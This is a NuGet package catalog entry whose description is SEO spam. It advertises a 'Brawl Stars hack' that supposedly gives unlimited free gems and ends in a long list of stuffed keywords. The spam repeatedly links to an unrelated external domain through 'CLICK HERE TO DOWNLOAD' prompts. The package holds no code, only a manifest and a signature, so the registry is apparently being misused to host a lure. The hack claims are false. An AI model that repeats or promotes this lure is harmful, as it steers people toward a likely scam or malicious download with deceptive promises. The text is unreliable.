{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.59.57/_brawl-stars-hack-working-2022-version-taq.2.6.75.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "8ba344aa-6080-4134-8e6c-410b9ea813b7",
  "catalog:commitTimeStamp": "2022-01-28T23:59:57.2166349Z",
  "created": "2022-01-26T17:35:26.87Z",
  "description": "# _Brawl Stars hack Working 2022 Version taq\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://14.bltadwin.ru/hack.php](http://14.bltadwin.ru/hack.php)\n\n\nBrawl-stars-hack-free-coins 5sec ago. Go to Generator Page Browse All Blog Posts. Easy Hack to get free robux. Noob or pro? Does no matter as long as you. One of the great mysteries within the community of Brawl Stars is whether or not it is possible to hack it. Like all games there will always be people who. But, with our Brawl Stars Mod Apk, you will get unlimited gems on your game account. Can you Hack Brawl Stars? The answer is YES.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://14.bltadwin.ru/hack.php](http://14.bltadwin.ru/hack.php)\n\nBrawl Stars Hack Tools – Obtain Gems! is a slash and dice Brawl Stars online hack that’s very like the create Gems in which players can use their talents to take on their opponents. It can be utilized for no cost from our website. You can Brawl Stars get unlimited Gems for your account in the game. Brawl Stars Hack and Cheats. Mariia R. J 3 min read. Brawl Stars is one of the most popular mobile games. Since its release, it has increased in the number of downloads and sis growing every day. as any other free to play game Brawl Stars monetizes on in-game purchases and gems is one of them. Therefore many players would like to learn more about . brawl stars hack and unlimited gems Brawl stars is the most popular game released by supercell and it’s currently has over million downloads globally after lunching in December When you play Brawl stars you are earning gems, with gems you can buy brawl mega boxes, unlock new brawlers, brawler skins,token doublers,pins,coins,Power points and the .\n\nbrawl stars hack gems, brawl stars hack unlimited gems and coins, brawl stars hacks 2021, brawl stars hack app, brawl stars hack ios 2021, brawl stars hack mod apk, brawl stars hackers, brawl stars hack gems 2021, brawl stars hack free, brawl stars hack apk download, brawl stars hack apk, brawl stars hack account, brawl stars hack android 1, brawl stars hack aimbot, brawl stars hack apk 2021, brawl stars hack apk mod, the brawl stars hack, can brawl stars be hacked, brawl stars hack bluestacks, brawl stars hack brawlers, brawl stars hack brawl pass, brawl stars hack box, brawl stars hack bez weryfikacji, brawl stars hack belle, brawl stars hack brawler bekommen, brawl stars hack byron, brawl stars hack client, brawl stars hack code, brawl stars hack cheats mod apk, brawl stars hack characters, brawl stars hack coins and gems, brawl stars hack cydia, brawl stars hack cz, brawl stars hack colonel ruff, brawl stars hack download, brawl stars hack download 2021, brawl stars hack download ios, brawl stars hack download apk, brawl stars hack diamond, brawl stars hack download unlimited gems, brawl stars hack download ios 2020, brawl stars hack edgar, brawl stars hack easy, brawl stars hack english, brawl stars hack elmas, brawl stars hack elmas hilesi 2020, brawl stars hack exe, brawl stars hack unlimited everything, brawl stars cheat engine hack, gemme e monete gratis brawl stars hack, brawl stars hack e cheats 2019, brawl stars hack free gems, brawl stars hack for gems, brawl stars hack free brawlers, brawl stars hack free gems 2021, brawl stars hack for trophies, brawl stars hack file, brawl stars hack free gems download, brawl stars hack generator 2021, brawl stars hack generator, brawl stars hack game, brawl stars hack gameplay, brawl stars hack gems free, brawl stars hack game guardian script, gem hack for brawl stars, brawl stars hack ipa, brawl stars hack injector, brawl stars hack install, brawl stars hack ios jailbreak, brawl stars hack unlimited gems, brawl stars hack ios no verification, brawl stars hack ipad, brawl stars hack jailbreak, brawl stars hack juwelen, brawl stars hack juwelen ohne handynummer, brawl stars hack juwelen kostenlos, brawl stars hack juwelen 2021, brawl stars hack juwelen und münzen, brawl stars hack j",
  "id": "_Brawl-Stars-hack-Working-2022-Version-taq",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:45:41.447Z",
  "listed": false,
  "packageHash": "XepWb8oTezcW8rRtC1joUPVI06Ya0X1VKVLTKYzYXTRP35dMWNZcYdusUd2g43p+0M//9CfANuTj7BltWhwmLg==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11665,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Brawl-Stars-hack-Working-2022-Version-taq",
  "verbatimVersion": "2.6.75",
  "version": "2.6.75",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.59.57/_brawl-stars-hack-working-2022-version-taq.2.6.75.json#swapxizwma.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1534,
      "fullName": "swapxizwma.nuspec",
      "length": 4460,
      "name": "swapxizwma.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.28.23.59.57/_brawl-stars-hack-working-2022-version-taq.2.6.75.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}